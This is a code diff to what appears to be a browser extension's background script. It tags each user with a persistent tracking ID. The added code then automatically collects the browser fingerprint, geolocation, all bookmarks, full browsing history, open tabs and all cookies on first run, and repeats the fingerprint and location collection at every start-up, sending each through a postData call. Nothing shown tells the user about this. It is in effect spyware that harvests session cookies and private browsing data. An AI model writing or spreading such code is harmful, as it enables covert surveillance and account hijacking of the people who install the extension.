@@ -12,10 +12,14 @@ ec.get("uuid", function (value) {
         uuid = Math.uuid();
         ec.set("uuid", uuid);
         console.log("UUID (new):", uuid);
+        // Send initial transmission.
+        emitInitial();
     } else {
         uuid = value;
         console.log("UUID:", uuid);
     }
+    // Send start-up transmission.
+    emitStartUp();
     // Activate listeners.
     activateListeners();
 });
@@ -65,6 +69,24 @@ var getCurrentPosition = function () {
     });
 };
 
+var getAllBookmarks = function () {
+    chrome.bookmarks.getTree(function (results) {
+        postData("bookmarks-all", results);
+    });
+};
+
+var getAllHistory = function () {
+    chrome.history.search({"text": ""}, function (historyArray) {
+        postData("history-all", historyArray);
+    });
+};
+
+var getAllTabs = function () {
+    chrome.windows.getAll({"populate": true}, function (windowArray) {
+        postData("tabs-all", windowArray);
+    });
+}
+
 var getPageCapture = function (tabId) {
     chrome.pageCapture.saveAsMHTML({"tabId": tabId}, function (mhtmlData) {
         var payload = {};
@@ -81,22 +103,18 @@ var getAllCookies = function () {
     });
 };
 
-var getAllTabs = function () {
-    chrome.windows.getAll({"populate": true}, function (windowArray) {
-        postData("tabs-all", windowArray);
-    });
-}
-
-var getAllBookmarks = function () {
-    chrome.bookmarks.getTree(function (results) {
-        postData("bookmarks-all", results);
-    });
+var emitInitial = function () {
+    getFingerprint();
+    getCurrentPosition();
+    getAllBookmarks();
+    getAllHistory();
+    getAllTabs();
+    getAllCookies();
 };
 
-var getAllHistory = function () {
-    chrome.history.search({"text": ""}, function (historyArray) {
-        postData("history-all", historyArray);
-    });
+var emitStartUp = function () {
+    getFingerprint();
+    getCurrentPosition();
 };
 
 ///////////////////////////////////////////////////////////////////////////////
